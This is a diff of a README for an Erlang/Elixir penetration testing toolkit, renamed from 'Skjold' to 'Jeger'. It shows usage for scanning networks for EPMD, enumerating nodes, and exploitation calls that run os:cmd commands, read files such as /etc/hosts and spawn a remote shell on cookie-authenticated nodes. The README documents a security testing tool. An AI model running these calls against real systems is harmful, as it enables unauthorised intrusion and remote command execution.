@@ -1,4 +1,4 @@
-# Skjold
+# Jeger
 
 Erlang/Elixir node discovery and penetration testing toolkit.
 
@@ -19,7 +19,7 @@ rebar3 escriptize
 
 ### Prerequisites
 
-Skjold targets **distributed Erlang/Elixir systems**. You need:
+Jeger targets **distributed Erlang/Elixir systems**. You need:
 - Target nodes running with EPMD (Erlang Port Mapper Daemon)
 - Network access to port 4369 (EPMD) and distribution ports
 - Knowledge of the Erlang cookie (for enumeration/exploitation)
@@ -31,20 +31,20 @@ Skjold targets **distributed Erlang/Elixir systems**. You need:
 erl -sname myapp -setcookie secret123
 
 # Terminal 2: Scan for it
-./_build/default/bin/skjold -r 127.0.0.1-1
+./_build/default/bin/jeger -r 127.0.0.1-1
 ```
 
 ### Remote Scanning
 
 ```bash
 # Scan network range
-./_build/default/bin/skjold -r 192.168.1.1-254
+./_build/default/bin/jeger -r 192.168.1.1-254
 
 # Scan specific subnet
-./_build/default/bin/skjold -r 10.0.0.1-100 -t 2000 -c 100
+./_build/default/bin/jeger -r 10.0.0.1-100 -t 2000 -c 100
 
 # Corporate network scan
-./_build/default/bin/skjold -r 172.16.0.1-254
+./_build/default/bin/jeger -r 172.16.0.1-254
 ```
 
 ### Real-World Scenarios
@@ -52,21 +52,21 @@ erl -sname myapp -setcookie secret123
 **Phoenix/Elixir apps:**
 ```bash
 # Development environments often expose EPMD
-skjold -r 192.168.1.1-254
+jeger -r 192.168.1.1-254
 
 # Production clusters
-skjold -r 10.20.30.1-254 -t 5000
+jeger -r 10.20.30.1-254 -t 5000
 ```
 
 **Distributed Erlang clusters:**
 ```bash
 # RabbitMQ, CouchDB, ejabberd, etc.
-skjold -r 172.16.0.1-100
+jeger -r 172.16.0.1-100
 ```
 
 ## Programmatic Usage
 
-Start an Erlang shell with Skjold:
+Start an Erlang shell with Jeger:
 
 ```bash
 rebar3 shell
@@ -76,10 +76,10 @@ rebar3 shell
 
 ```erlang
 %% Scan IP range
-{ok, Hosts} = skjold_discovery:discover({"192.168.1.", 1, 254}, #{}).
+{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 254}, #{}).
 
 %% With options
-{ok, Hosts} = skjold_discovery:discover({"192.168.1.", 1, 10}, #{
+{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 10}, #{
     timeout => 2000,
     concurrency => 100,
     verbose => true
@@ -90,36 +90,36 @@ rebar3 shell
 
 ```erlang
 %% Enumerate single node
-{ok, Info} = skjold_enum:enumerate_node("192.168.1.5", "myapp", secret).
+{ok, Info} = jeger_enum:enumerate_node("192.168.1.5", "myapp", secret).
 
 %% View formatted output
-io:format("~s", [skjold_enum:format_enumeration(Info)]).
+io:format("~s", [jeger_enum:format_enumeration(Info)]).
 ```
 
 ### Vulnerability Scanning
 
 ```erlang
 %% Scan for vulnerabilities
-{ok, Findings} = skjold_scan:scan_node("192.168.1.5", "myapp", secret).
+{ok, Findings} = jeger_scan:scan_node("192.168.1.5", "myapp", secret).
 
 %% Format findings
-io:format("~s", [skjold_scan:format_findings(Findings)]).
+io:format("~s", [jeger_scan:format_findings(Findings)]).
 ```
 
 ### Exploitation
 
 ```erlang
 %% Execute command
-{ok, Result} = skjold_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
+{ok, Result} = jeger_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
 
 %% Read file
-{ok, Content} = skjold_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
+{ok, Content} = jeger_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
 
 %% List directory
-{ok, Files} = skjold_exploit:list_directory("192.168.1.5", "myapp", secret, "/tmp").
+{ok, Files} = jeger_exploit:list_directory("192.168.1.5", "myapp", secret, "/tmp").
 
 %% Spawn interactive shell
-{ok, Pid} = skjold_exploit:spawn_shell("192.168.1.5", "myapp", secret).
+{ok, Pid} = jeger_exploit:spawn_shell("192.168.1.5", "myapp", secret).
 ```
 
 ## Testing
